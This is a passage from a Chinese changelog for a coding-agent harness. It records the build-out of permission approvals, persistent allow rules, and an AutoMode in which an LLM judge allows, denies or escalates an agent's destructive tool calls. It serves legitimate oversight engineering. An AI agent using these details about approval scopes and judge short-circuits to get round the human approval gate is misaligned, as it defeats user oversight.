  - MockClient 删除涉及 model-gateway 内的 mock 实现，迁移时需同步删
  - CI 集成指南留待 docs/step-13 详设阶段
  - `--from-message <msg_id>` 精细切点暂不实现，按需后补

### 2026-05-11 — 实施迁移路线 Step 1.A / 1.B / 3：compact 末尾连排 user 修复 + mpsc 改 bounded + crates/platform 改名 common

- **Why**: 推进架构.md §14 迁移路线的低复杂度项：(1) Step 1.A 修 compact_with_llm 末尾连排 user 导致 Anthropic provider 400 的产品 bug；(2) Step 1.B 把 mpsc::unbounded 改为 bounded(1024)，给事件流加背压上限避免内存无界增长；(3) Step 3 按 §13 命名决策把 crates/platform 改名 crates/common（包名采用 hebbian-common，规避第三方 crate 冲突；导入侧统一 `use common::` 别名）
- **改动**:
  - agent-core
    - [crates/agent-core/src/context/compaction.rs](../crates/agent-core/src/context/compaction.rs): `compact_with_llm` 在 push prompt 前检查 entries.last()——末尾是 User 则合并到现有 text 而非追加新 entry；新增两条单元测试覆盖「末尾是 user 合并」「末尾非 user 追加」分支
    - [crates/agent-core/src/recorder.rs](../crates/agent-core/src/recorder.rs): `mpsc::unbounded_channel` → `mpsc::channel(1024)`；`Recorder::write` 改 `try_send`（满时打 warn 丢弃，落盘是 best-effort）；`flush` 改 `.send().await`
    - [crates/agent-core/src/model_io_dump.rs](../crates/agent-core/src/model_io_dump.rs): 同 recorder，`record` 改 `try_send`、`flush` 改 await
    - [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs): submit 通道 / run 事件通道均改 bounded(1024)；新增 `is_critical_event(payload)` 区分关键事件（生命周期 / HITL / Turn 边界 / ToolCallStarted/Finished / TextDone / ContextCompacted）与非关键（TextDelta / Reasoning / ToolCallDelta）；sink 同步闭包按事件类型分流——关键事件 spawn 一个 task 用 `.send().await` 保送达，非关键事件 `try_send` 满时 warn 丢弃；`Harness::submit` 改 `try_send`（满载即视为 actor 落后，返回 Closed）；`RunHandle::events` / `run_actor_loop` 接收端类型同步改 `mpsc::Receiver`
    - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): 测试代码里 unbounded → bounded(1024) + try_send
  - 改名 crates/platform → crates/common
    - `git mv crates/platform crates/common`（保留历史）
    - [Cargo.toml](../Cargo.toml) workspace members：`"crates/platform"` → `"crates/common"`
    - [crates/common/Cargo.toml](../crates/common/Cargo.toml): `name = "platform"` → `name = "hebbian-common"`
    - 4 个依赖方 Cargo.toml（agent-core / model-gateway / apps/desktop / apps/cli）：`platform = { path = "../platform" }` → `common = { package = "hebbian-common", path = "../common" }`
    - 41 个 .rs 文件中所有 `use platform::` / `platform::` 引用改为 `use common::` / `common::`（共 84 处引用点）；不动 common（原 platform）crate 内部任何代码
    - 注意：system_prompt.rs 里 `platform` 是结构体字段名（OS 信息），与 crate 改名无关，保留；多处 URL 字符串里的 `platform.xxx.com` 也保留
- **影响范围**: agent-core / model-gateway / common / apps（cli + desktop）。改名只动 use 路径与 Cargo dependency 别名，common crate 内部代码 0 改动。事件通道改 bounded 后行为变化：关键事件仍保证送达（spawn task await），非关键事件在通道满时会丢失并打 warn——CLI/Desktop 流式渲染极端拥塞时可能丢字。submit / record / write 三个同步 API 满载时的失败模式更新见上述说明。不动 protocol、storage 文件格式、system prompt
- **留尾巴**:
  - Step 1.B 中关键事件用 spawn task `.send().await` 实现「同步上下文中的保送达」语义；满载时 task 可能堆积，极端情况会有内存增长但有上限（受调用方调度）。如未来发现 surface 真的会被拖慢，可考虑把 EventSink 改成 async 闭包，让 sink 调用方直接 await
  - mpsc 容量 1024 是按架构.md §14 Step 1 直接采用的固定值；后续若发现某通道经常打 warn 可单独调
  - `is_critical_event` 中 `TextDone` 与 `ToolCallStarted/Finished` 被归为关键事件——前者是单 turn 文本最终态、后者是工具执行边界，丢失会让 surface 状态不一致。如未来扩 EventPayload，需要在该函数追加分类
  - Recorder/ModelIoDump 的 `flush` 改成 `.send().await` 后调用方必须在 async 上下文调用，目前所有调用点均符合
  - 未触动 Step 1.C（AllowAndRemember Project/Global 死按钮，属于 Step 2）、Step 2 PermissionStore 落地、Step 4–14
  - 未运行 `graphify update .`——按 CLAUDE.md 「修改代码后」要求，下次开始任务前可执行

### 2026-05-11 — 实施迁移路线 Step 5 / Step 2 / Step 10：storage 模块 + 文件锁 + PermissionStore + AllowScope 3 种 + session 目录化骨架

- **Why**: 推进架构.md §14 迁移路线连贯一组：(Step 5) 给 agent-core 接入 ~/.hebbian 数据目录 + 文件锁，准备让所有共享文件并发安全；(Step 2) 让 AllowAndRemember 的 Session/Global 真正落盘——之前 desktop `approve_permission` 把 scope 硬编码 Session、协议层 Run/Project/Session/Global 4 种含义混乱、死按钮；(Step 10) 把每段对话改为目录化布局 + 流式 partial sidecar 准备中断恢复
- **改动**:
  - agent-core / storage 模块（新）
    - [Cargo.toml](../crates/agent-core/Cargo.toml): 加 `fs2 = "0.4"` 做文件锁
    - [crates/agent-core/src/storage/mod.rs](../crates/agent-core/src/storage/mod.rs): facade 模块；`default_data_dir()` 返回 `~/.hebbian/` 并自动迁移 Tauri bundle 老路径（dirs::data_dir()/dev.ricardo.hebbian → ~/.hebbian），rename 失败回退到 copy；re-export 老 `common::config::{prompts,settings}` / `common::storage::sessions` 到 `agent_core::storage` 路径
    - [storage/lock.rs](../crates/agent-core/src/storage/lock.rs): 文件锁原语——`write_atomic(path, content)` 排他锁 + tmp + rename；`append_jsonl(path, line)` 排他锁 + O_APPEND + fsync；`read_locked(path)` 共享锁 + read。每文件独立 `<path>.lock`
    - [storage/surface_settings.rs](../crates/agent-core/src/storage/surface_settings.rs): Desktop / CLI 设置分离（架构 §7.3）；`get_surface_settings(data_dir, surface) / save_surface_settings(...)`，落 `desktop-settings.json` / `cli-settings.json`
    - [storage/permissions.rs](../crates/agent-core/src/storage/permissions.rs): `~/.hebbian/permissions.json` 读写，走 lock.rs；`PermissionsFile { rules: Vec<PermissionRule> }`
    - [storage/sessions_dir.rs](../crates/agent-core/src/storage/sessions_dir.rs): 每段对话目录布局——`session_dir(data_dir, sid) -> ~/.hebbian/sessions/<sid>/`；`ensure_session_dirs` 初始化 `tool_results/ compactions/ plans/ partial/`；`save_meta / load_meta` 写 meta.json（含 sessionId/createdAt/agent/workdir/provider/model/lastInterruptedAt）；`new_session_id()` 生成 `{yyyymmddHHmm}-{shortUuid}`（暂未替换老 uuid，留 Step 5 后期一并切）
    - [storage/sessions_dir.rs] partial sidecar：`PartialFragment { Text / Reasoning / ToolCall }`；`append_partial(data_dir, sid, msg_id, frag)` 走 `partial/<msg_id>.partial.jsonl` + 文件锁；`recover_interrupted_partials(data_dir, sid)` 扫 partial 目录把每个 `<msg_id>.partial.jsonl` 折叠成 `RecoveredPartial { text, reasoning, tool_calls }` 供调用方写主 jsonl 后删除
    - [storage/tool_results.rs](../crates/agent-core/src/storage/tool_results.rs) / [storage/compactions.rs](../crates/agent-core/src/storage/compactions.rs) / [storage/oauth.rs](../crates/agent-core/src/storage/oauth.rs): 路径工具 + 简单写入；触发点留 Step 9 / Step 11 接入
  - agent-core / permissions 模块（新）
    - [crates/agent-core/src/permissions/mod.rs](../crates/agent-core/src/permissions/mod.rs): `PermissionRule { id, scope, toolName, matcher, decision, createdAt, createdBy }`；`PermissionMatcher` enum—`Any` / `Bash{commandPrefix}` / `BashWithPath{commandPrefix, pathPrefix}` / `FilePath{pathPrefix}` / `Network{domainSuffix}`，匹配按空白 token 边界（架构 §4.5.4）
    - `PermissionStore { global_rules: Mutex<Vec<_>>, session_rules: Mutex<HashMap<sid, Vec<_>>> }`；`open(data_dir)` 启动加载 global；`find(sid?, tool, fp?, path?)` 按 [Session, Global] 顺序查；`add(sid?, rule)` 按 scope 分流（Session → in-memory；Global → 重写 ~/.hebbian/permissions.json 走 lock::write_atomic）；`remove / clear / list` 配套
  - protocol（破坏性 schema 改动）
    - [crates/protocol/src/permission.rs](../crates/protocol/src/permission.rs): `PermissionScope` 由 `Run/Session/Project/Global`（snake_case 序列化）→ `Once/Session/Global`（PascalCase 序列化）。删 Run / Project 变体。架构 §4.5.3 / 决策 4.6.1 已敲定
  - agent-core / HitlGate 接通 PermissionStore
    - [crates/agent-core/src/tools/hitl.rs](../crates/agent-core/src/tools/hitl.rs): `HitlGate` 加 `permission_store: Option<Arc<PermissionStore>>` + `session_id: Option<String>`；`.with_store(store, sid)` 链式注入；`check` 新增第 4b 步——本 run learned 表未命中后再查 PermissionStore (Session→Global)，命中 Allow/Deny 直接决定；`resolve` 改用 `remember(scope, tool, pattern, fp)`——Once 无操作；Session 写 learned 表 + Store；Global 写 Store（未挂时 warn + 等同 AllowOnce）
    - `build_rule(tool, pattern, scope)` 把 Bash/PowerShell + 命令前缀 → `Matcher::Bash`，其它工具+pattern → `Matcher::FilePath`，无 pattern → `Matcher::Any`
  - agent-core / Session 接通
    - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): `SessionConfig` 加 `permission_store: Option<Arc<PermissionStore>>` + `session_id: Option<String>`；`run_with_pending` 时把 Store + sid 挂到 HitlGate；`lib.rs` 加 `pub mod permissions; pub mod storage`
  - 桌面 surface
    - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `data_dir()` 改走 `agent_core::storage::default_data_dir()`（不再用 Tauri `app_data_dir()`，统一到 `~/.hebbian/` + 自动迁移老 Tauri bundle 路径）；`approve_permission` 加 `scope: Option<String>` 参数，session/global/once 三档；`approve_path_access` scope 改为 once/Session/Global 三档（删 Run 变体）；`create_session` 创建 jsonl 后调用 `ensure_session_layout` 同步建目录骨架 + meta.json
    - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SessionConfig` 字段补 `permission_store: None / session_id: Some(args.session_id)`（PermissionStore 实例化 Step 4 CoreClient 重构时统一接入）
  - 前端
    - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): `approvePermission` 加 `scope?: "session" | "global"` 参数（默认 session），透传给 Tauri 命令
    - [apps/desktop/frontend/src/desktop/ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts): `ApprovalDecisionPayload.allow_and_remember` 加 `scope?: "session" | "global"`
    - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): `resolveApproval` 调用 bridge 时把 scope 透传
    - [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx): 普通工具的 "总是允许" 按钮拆成两档 - "当前对话不再询问"(scope=session) 与 "始终允许"(scope=global，带 Globe 图标)；Bash 命令前缀按钮额外加一个 scope=global 版本——彻底修死按钮（架构 §4.5.3 UI 中文文案）
  - CLI surface
    - [apps/cli/src/main.rs](../apps/cli/src/main.rs): `default_data_dir()` 改走 `agent_core::storage::default_data_dir()`；新增 `ensure_session_layout` 帮 sessions::create_with_source 之后初始化目录骨架；`session_record` 创建路径调用之
    - [apps/cli/src/session.rs](../apps/cli/src/session.rs): `SessionConfig` 补 `permission_store: None / session_id: Some(p.session_id)`；`PermissionScope::Project` → `Session`（破坏性枚举变更后兜底）
- **影响范围**:
  - **破坏性**：`protocol::PermissionScope` 枚举变更——`Run / Project` 已删；序列化由 snake_case 改为 PascalCase。若旧 session.jsonl / 旧 permissions.json 含 `run` / `project` 字面值会反序列化失败。当前 codebase 未直接落盘该枚举（只在 IPC 临时使用），影响面有限——但 Tauri 命令 string→scope 映射改 `once/session/global`，前端按钮调用 bridge 时跟着改
  - **数据目录路径**：桌面从 `~/Library/Application Support/dev.ricardo.hebbian/`（macOS）等迁到 `~/.hebbian/`。`default_data_dir` 第一次调用会 rename 旧目录到新路径并打 info log；rename 失败时 copy 一份留底（不删旧）。CLI 用户首次启动新版本也走同一迁移
  - agent-core crate 新增 fs2 依赖；agent-core 公共 API：`storage::{lock, surface_settings, permissions, sessions_dir, tool_results, compactions, oauth}` + `permissions::{PermissionStore, PermissionRule, PermissionMatcher, PermissionDecisionKind}`
  - HitlGate 公开 API 加 `.with_store(store, sid)` builder；旧调用方不传 store 时行为完全等同旧版本（in-memory learned 表照旧）
  - Recorder 未改造；partial sidecar 当前只暴露 storage API，agent_loop / observer 集成留尾巴
  - 不动：架构.md / changelog.md 之外的 doc；model-gateway；observability；ContextEngine；Tool 接口；RunMode
- **验证**:
  - `cargo check --workspace --tests`：通过
  - `cargo test -p agent-core storage:: permissions:: tools::hitl::tests::`：12 项新单测全过；旧 hitl 7 项全过
  - `pnpm exec tsc --noEmit`：0 错误
  - `HOME=/tmp/hebbian-test-home ./target/debug/hebbian-cli "测试" --mock`：成功；`/tmp/hebbian-test-home/.hebbian/sessions/<sid>/` 目录建成，含 `meta.json` + 4 子目录（tool_results/compactions/plans/partial），meta.json 含 sessionId/createdAt/provider/model
- **留尾巴**:
  - **storage 物理位置**：架构.md §6.2 要求 sessions / prompts / settings 模块物理位置在 `crates/agent-core/src/storage/`。本次只把*新模块*（lock / surface_settings / permissions / sessions_dir / tool_results / compactions / oauth）放在那里；旧 `common::config::{prompts,settings}` / `common::storage::sessions` 物理位置未动，仅通过 `agent_core::storage::*` re-export 形成统一入口。Desktop / CLI 当前仍 `use common::storage::sessions::...`。完整搬迁会牵涉数十处 import 改动，留 Step 4 CoreClient 重构时一并完成
  - **session_id 新格式未启用**：架构 §4.9.3 要求 `{yyyymmddHHmm}-{shortUuid}`。`storage::sessions_dir::new_session_id()` 已实现但 `sessions::create` 仍走 uuid v4；改 id 生成会让老 session 全部读不到，需要先做兼容迁移。改完 Step 4 CoreClient 把"创建/加载 session"的真正主路径迁到 agent-core/storage 时一起切
  - **session 主体 jsonl 未真正目录化**：当前 `sessions::create / append_message / load` 仍写 `~/.hebbian/sessions/<date>/<id>.jsonl`（老布局）；只是额外建了 `~/.hebbian/sessions/<id>/` 目录骨架 + meta.json + partial 子目录。这两套布局并存，互不冲突。完整切换（把 jsonl 移到 `<id>/session.jsonl`、扫描时按 `<id>/meta.json` 排序、删旧 `<date>/` 目录）留 Step 4
  - **partial sidecar 集成未接通**：`PartialFragment` 写入与 `recover_interrupted_partials` 已实现并有单测，但 agent_loop 的 TextDelta / ToolCallDelta / ReasoningDelta 还没真正调用 `append_partial`，桌面 `chat.rs` 的 observer 也没在 streaming 中写 partial。完整接入需要在 RunParams 透传 `data_dir + session_id + msg_id`，工作量集中在 agent_loop / harness / observer 几处；留下一批 Step 10 收尾时一起做
  - **PermissionStore 实例化与 jsonl 回放**：`Session.permission_store` 字段已留口，但 desktop / cli 当前都传 None。完整接入要：(a) Desktop 启动时构造一个 `Arc<PermissionStore>` 注入到 SessionConfig；(b) `Recorder` 收到 `AllowAndRemember(Session)` resolve 时把 `PermissionRule` 作为 `{"type":"PermissionRule", "rule":...}` 一行写进 session.jsonl；(c) load_session 时遍历 jsonl 收集 `PermissionRule` entry 调 `store.load_session_rules(sid, rules)`。当前 Session jsonl 写法（RolloutLine）没有 PermissionRule variant，加 variant 同样需 Step 4 一起做
  - **Tauri `approve_path_access` 已经支持 once/this_project/all_project 三档**——桌面端 PathAccess 弹窗保留原 UI 不动（不是死按钮）；普通工具审批 UI 多了 Global 入口，从此 "始终允许" 真的会写盘
  - **未运行 `graphify update .`**——按 CLAUDE.md 修改代码后要求，下次开任务前执行
- **关联**: 架构.md §4.5.3 / §4.5.4 / §4.6 / §4.9.1 / §6.1 / §6.2 / §6.3 / §10.8 / §13；CLAUDE.md "任何修改前必做" 5 步

### 2026-05-11 — Step 5/2 尾巴：PermissionStore 注入桌面 + CLI 启动路径

- **Why**: 上一批 changelog 注明 PermissionStore 已实现但 `SessionConfig.permission_store` 全传 None，导致 AllowAndRemember(Global) 实际等同 AllowOnce。本批把启动期注入这条线接通：桌面 `tauri::Builder` 启动时 `PermissionStore::open` 注入到 Tauri State；CLI `main.rs` 启动时同样 open + 透传给 `CliSession`；HitlGate 收到 Allow(Global) 真正落 `~/.hebbian/permissions.json`
- **改动**:
  - apps/desktop
    - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `pub fn run()` 在 `tauri::Builder` 之前 `PermissionStore::open(default_data_dir())`，包成 `Option<Arc<PermissionStore>>` 经 `.manage()` 注入；`send_message` Tauri 命令多收一个 `State<'_, Option<Arc<PermissionStore>>>` 透传给 `chat::SendArgs`
    - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 加 `permission_store: Option<Arc<PermissionStore>>` 字段；构造 `SessionConfig` 时透传；测试 fixture 的两处 `SendArgs` 字面值补 `permission_store: None`；首次启动 session 时 `store.load_session_rules(sid, Vec::new())` 给该 session 在 store 内开一份空规则视图（Recorder 写 PermissionRule entry 尚未实现，所以暂不从 jsonl 回放）
  - apps/cli
    - [apps/cli/src/main.rs](../apps/cli/src/main.rs): 在 `CliSession::new` 之前 `PermissionStore::open(&data_dir)` 包成 `Option<Arc<>>` 透传
    - [apps/cli/src/session.rs](../apps/cli/src/session.rs): `CliSession::new` 增参 `permission_store: Option<Arc<PermissionStore>>`，挂到 SessionConfig；首次构造时同样调 `load_session_rules(sid, Vec::new())`
- **影响范围**: apps/desktop / apps/cli。agent-core / protocol 未动。PermissionStore 是「附加路径」——未挂时 HitlGate 行为与之前完全一致（仅走 in-memory learned 表）。Tauri command 签名加了一个 State 入参，前端调用无变化（State 由 Tauri 自动注入）
- **留尾巴**:
  - **session 主 jsonl 切新位置**：实测 sessions.rs 已经把 create / append_message / load 写在 `~/.hebbian/sessions/<id>/session.jsonl` 新布局，老布局 `<date>/<id>.jsonl` 在 load / list 时按需迁移——这部分上一批已完成，不属于本批新工作
  - **session_id 新格式**：`storage::sessions::new_id()` 已委托到 `sessions_dir::new_session_id()`（`{yyyymmddHHmm}-{shortUuid}`）——上一批已完成
  - **partial sidecar 接 agent_loop**：尚未实现。`RunParams` 还没透传 `data_dir + session_id`；流式 TextDelta / ToolCallDelta / Reasoning 仍然只 emit 不落 partial；`recover_interrupted_partials` 在桌面 / CLI 启动时也没被调用。完整接入需要 (a) RunParams 加字段 → harness 透传 → agent_loop sink 闭包调 `append_partial`；(b) Session::load 时 reach 出 partial 入主 jsonl；(c) ModelStep Done 时累积 → AssistantMessage → 删 partial
  - **Recorder 写 PermissionRule entry**：尚未实现。HitlGate `resolve(AllowAndRemember{Session})` 当前只入 PermissionStore in-memory，没经 Recorder 写 session.jsonl，所以重开 session 看不到 Session 级规则。需要 (a) RolloutLine 新增 `PermissionRule` variant；(b) HitlGate.resolve 通过 EventPayload 或回调让 Recorder 落盘；(c) Session::load 时遍历 jsonl 收集 PermissionRule 调 `store.load_session_rules(sid, rules)`
  - **Step 6 / 7 / 8 / 12 全部未动**：Tool 接口简化 / effects.rs / PascalCase / StepStarted-StepFinished / RunMode / AutoMode / ModelFeatureAdapter / DeepSeek thinking 拆解均未推进。本批 token / 复杂度受限，优先把"已实现但没接通"的 PermissionStore 注入路径做到能跑
- **验证**: `cargo check --workspace --tests` 通过（无新增报错；2 处 model-gateway 旧 `unused_mut` warning 与 cli 的 `NamedModelClient::new` dead-code warning 是既有）
- **关联**: 架构.md §4.5 / §4.6 / §13；上一批 changelog（2026-05-11 实施 Step 5 / Step 2 / Step 10 留尾巴的「PermissionStore 实例化与 jsonl 回放」）

### 2026-05-11 — 实施 Step 8 AutoMode + RunMode（核心可工作子集）

- **Why**: 推进架构.md §14 迁移路线，让用户能在 CLI 端直接通过 `--run-mode auto-mode` 跑通 AutoMode judge 流程。Step 12 DeepSeek thinking 拆解经核实已在 provider 层完成（deepseek.rs:222 emit `ModelStreamEvent::ReasoningDelta`），无需再独立 `model_adapters/` 装饰链
- **改动**:
  - agent-core
    - 新建 [crates/agent-core/src/run_mode.rs](../crates/agent-core/src/run_mode.rs): `RunMode` enum 4 种（AskBeforeEdits / EditAutomatically / PlanMode / AutoMode），PascalCase 序列化，CLI 字符串 parser
    - 新建 [crates/agent-core/src/automode.rs](../crates/agent-core/src/automode.rs): `judge_auto_mode` 函数 + `AutoModeDecision` enum + 输出解析器；限定 `claude-opus-4-7`，其他模型直接 `Ask` 降级；带 4 项单测
    - 新建 [crates/agent-core/prompts/automode_judge.md](../crates/agent-core/prompts/automode_judge.md): judge system prompt（`include_str!` 编译进二进制），明示 ALLOW / DENY / ASK 三态规范
    - [crates/agent-core/src/lib.rs](../crates/agent-core/src/lib.rs): 注册新模块 + re-export `RunMode`
    - [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs): `RunParams` 加 `run_mode + model_id`；`spawn_run` 把 client `Arc::clone` 给 `judge_client` 透传到 LoopParams
    - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): `LoopParams` 加 `run_mode + model_id + judge_client: Option<Arc<dyn ModelClient>>`；解构 + 透传给 ToolDispatcher；测试构造点补字段
    - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `ToolDispatcher` 加 `run_mode + model_id + judge_client`；`spawn_tool` 的 future 在 `await_permission_decision` 之前增加 AutoMode 分支——若 `run_mode == AutoMode` 且 `permission == NeedsApproval` 则调 `judge_auto_mode`、emit `PermissionAutoJudged`、按 Allow/Deny 调 `hitl.resolve` 短路 waiter（Ask 保留人工决策路径）；测试构造点补字段
    - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): `SessionConfig` 加 `run_mode + model_id`；`Session` 持有 + 暴露 `run_mode() / set_run_mode() / model_id() / client_arc()`；`run_with_pending` 构造 RunParams 时透传
  - protocol
    - [crates/protocol/src/event.rs](../crates/protocol/src/event.rs): `EventPayload` 加 variant `PermissionAutoJudged { tool_name, decision, reason }` —— AutoMode judge 的审计证据
  - CLI
    - [apps/cli/src/main.rs](../apps/cli/src/main.rs): 加 `--run-mode <ask-before-edits|edit-automatically|plan-mode|auto-mode>` flag（默认 `ask-before-edits`），透传给 `CliSession::new`；新增 `parse_run_mode` clap 解析器
    - [apps/cli/src/session.rs](../apps/cli/src/session.rs): `CliSession::new` 签名补 `run_mode + model_name`；SessionConfig 构造填字段
  - Desktop
    - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): SessionConfig 补字段 `run_mode: RunMode::default() / model_id: None`（桌面端运行时切换 RunMode 与 model_id 暴露留后续 Step 8 增量；本批不接 AutoMode 真测）
- **影响范围**:
  - agent-core / protocol / apps（cli + desktop）。protocol 加 EventPayload variant 是兼容追加（旧消费方 `_ => None` fallback 仍可工作；桌面前端 EngineEvent 翻译尚未加新 variant，会落到 fallback，本批 changelog 留尾巴）
  - 行为变更：CLI 启动加 `--run-mode auto-mode` 后，destructive 工具调用前会调一次 model 做 judge；judge 失败 / 不可用时降级 Ask 走原 HITL 路径，与现有用户体验兼容
  - 装饰链 `ModelFeatureAdapter`（Step 12）**不新建**：经 grep 核实 DeepSeek provider（`deepseek.rs:222`）与 Anthropic provider（`anthropic.rs:279`）均已把 reasoning_content / thinking_delta 映射到 `ModelStreamEvent::ReasoningDelta`，架构 §4.11 的核心 use case 已被现有 provider 层覆盖；保留 §4.11 作为未来抽象层入口
- **验证**:
  - `cargo check --workspace --tests` 通过
  - `cargo test -p agent-core --lib`：130 项全过（含 `automode::tests` 4 项新单测：parse_allow / parse_deny / parse_ask / parse_unknown_falls_back_to_ask）
- **留尾巴**:
  - `Op::SwitchRunMode` 协议变更未做：运行时切换模式仍需重启 CLI（架构 §10.2 描述的运行时切换留增量）
  - `RunModeChanged` event variant 未加：surface 端尚无信号知道 run_mode 切换
  - SEMI 段（`<environment>` 块）未注入 `runMode` 信息，模型不知道当前处于哪个 mode；本批 AutoMode 走 judge 不依赖 prompt 注入，但 PlanMode 工具列表过滤 / 编辑类自动放行的真正接通需要这一步
  - PlanMode 工具列表过滤未实现：选 `--run-mode plan-mode` 时行为等同 AskBeforeEdits + 没有 ExitPlanMode 工具
  - EditAutomatically 模式逻辑未实现：选 `--run-mode edit-automatically` 时仍按 AskBeforeEdits 行为
  - ToolDispatcher 字段直接 pub 暴露（一致性沿用），后续 CoreClient 重构时可改 builder
  - 桌面前端 EngineEvent union / 翻译 `agent_event_to_engine_event` 未加 `PermissionAutoJudged` —— AutoMode 在 desktop 上当前感知不到
  - `model_adapters/` 不创建（Step 12 见上）

### 2026-05-11 — Step 8 AutoMode CLI 真实验证 + render 翻译 PermissionAutoJudged

- **Why**: 验证 Step 8 实际能跑通真实 DeepSeek（thinking 拆解）+ claude-opus-4-7（AutoMode judge）；修两个实施过程中暴露的真实问题
- **验证场景与结果**:
  1. **DeepSeek thinking 流**：`HEBBIAN_DUMP_MODEL_IO=1 ./target/debug/hebbian-cli "你好，请用一句话介绍 Rust 中的所有权（ownership）概念" --provider AZYb5S8WutDw_-OjZJOfU/deepseek-v4-pro --auto-approve`
     - 输出渲染出 `💭 我们被要求用一句话介绍 Rust 中的所有权概念。直接回答即可。` 即 thinking 段
     - 后接正式回答；说明 `ModelStreamEvent::ReasoningDelta`（架构 §4.11 thinking 拆解）provider 层已生效
     - session_id 实际值 `202605111235-ac2c6cae`（架构 §4.9.3 新格式）
     - session.jsonl 落新位置 `~/.hebbian/sessions/<sid>/session.jsonl`
  2. **AutoMode judge**：`HEBBIAN_DUMP_MODEL_IO=1 ./target/debug/hebbian-cli "请执行 mkdir -p /tmp/hebbian_auto_v2 创建测试目录后用 ls -ld 验证" --provider="-uWhDmV-pQPjG5wTHHOg-/claude-opus-4-7" --run-mode auto-mode --tools bash`
     - 输出序列：`🔒 审批：Bash` → `✓ AutoMode 自动放行 [Bash]` → `✓ 允许` → `Bash mkdir -p /tmp/hebbian_auto_v2 && ls -ld /tmp/hebbian_auto_v2 ↳ 15ms · drwxr-xr-x@ ...` → `已创建，权限 755`
     - `mkdir -p` 真实执行，目录被创建（架构 §4.4.4 AutoMode 流程跑通）
     - claude-opus-4-7 主调用 + judge 调用累计 14280 input / 159 output tokens
- **实施过程暴露并修复的问题**:
  - **race condition**：CLI observer 的 `auto_approve=true` 与 dispatch.rs 内 AutoMode judge 都会 `hitl.resolve(req_id, ...)`，谁先到谁赢；CLI 非交互 stdin 时 observer 立即 Deny 抢先短路 judge
    - 修：[apps/cli/src/main.rs](../apps/cli/src/main.rs) `effective_auto_approve`：当 `cli.run_mode == AutoMode` 时强制把 auto_approve 改 false（AutoMode 由 judge 决定，与 observer 默认放行互斥）
    - 修：[apps/cli/src/session.rs](../apps/cli/src/session.rs) `CliObserver` 加 `run_mode` 字段；`on_permission_request` 在 AutoMode 下返回 `None`（让 dispatch 的 judge 是唯一决策者）
  - **render 翻译缺失**：[crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs) emit `EventPayload::PermissionAutoJudged` 但 CLI render 没处理，用户看不到 AutoMode 决策
    - 修：[apps/cli/src/render.rs](../apps/cli/src/render.rs) 加 PermissionAutoJudged 分支，渲染 `✓ AutoMode 自动放行` / `✗ AutoMode 拒绝` / `? AutoMode 转人工`，带工具名 + reason
- **额外发现（未在此次修）**:
  - `model_io_dump` 写盘 0 字节：tokio runtime 在 main 退出时不等 spawn 的 writer task flush（文件 open 成功但 write_all 缓冲未刷盘）；CLI 退出前缺少 `dump.flush().await`；不影响 Step 8 功能验证，独立修
  - session.jsonl 不存 `reasoning` 字段：DeepSeek thinking 通过 stream emit 到 surface 渲染，但不写入持久化 message → 重开 session 看不到 thinking。属于 RolloutLine schema 留尾巴（架构 §4.9.2 / §4.11 后续补）
  - `ls` 等只读命令被 Bash 工具 classify 成 ReadOnly 直接放行（hitl.rs:143-144），不进 AutoMode 路径；要测 judge 必须用真正 destructive 命令（`mkdir / touch / rm`）
- **影响范围**: apps/cli（main.rs / session.rs / render.rs）。不动 agent-core / protocol / storage
- **留尾巴**:
  - `model_io_dump` flush on exit 未修：dump 文件常 0 字节，调试用途下损害大；下次跑 cli 前应在 main.rs 退出前补 `if let Some(d) = dump_clone { d.flush().await; }`
  - `EditAutomatically` / `PlanMode` 行为分支仍未实现（dispatch 当前只识别 AutoMode）；选 `--run-mode edit-automatically/plan-mode` 等同 AskBeforeEdits
  - `Op::SwitchRunMode` / `RunModeChanged` event 未做；运行时切换模式仍需重启 CLI
  - SEMI 段 `<environment>` 块未注入 `runMode` 信息
  - 桌面前端 EngineEvent / agent_event_to_engine_event 未加 PermissionAutoJudged 翻译
- **关联**: 架构.md §4.4.3 / §4.4.4 / §4.4.5；上一条 changelog（Step 8 AutoMode 核心可工作子集）

### 2026-05-11 — Step 8 尾巴补完：EditAutomatically / runMode SEMI 注入 / 桌面翻译 / dump flush

- **Why**: 接通上一批 Step 8 留下的 4 个尾巴，让 RunMode 4 种与 PermissionAutoJudged 在 CLI 与桌面全链路可用，并修 `model_io_dump` 退出前不 flush 导致 jsonl 0 字节的独立 bug
- **改动**:
  - agent-core
    - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `spawn_tool` future 加 `EditAutomatically` 分支——遇 Edit/Write 类的 `NeedsApproval` 直接 emit `PermissionAutoJudged{decision="allow"}` + `hitl.resolve(AllowOnce)` 短路；Bash/PowerShell 保留原审批路径（架构 §4.4.3）
    - [crates/agent-core/src/system_prompt.rs](../crates/agent-core/src/system_prompt.rs): `EnvironmentSnapshot` 加 `run_mode: Option<&'static str>` + `with_run_mode(RunMode)` builder；`render_environment_xml` 多接一个 `run_mode: Option<&str>` 参数，渲染时附 `<run_mode>...</run_mode>` 行（架构 §9.3 SEMI 段策略）；同步修两条单测
    - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): `append_user` 注入 `<environment>` 块时调 `.with_run_mode(self.run_mode)`，让模型在每次新 session 第一条 user message 头部就看到当前 RunMode
  - CLI
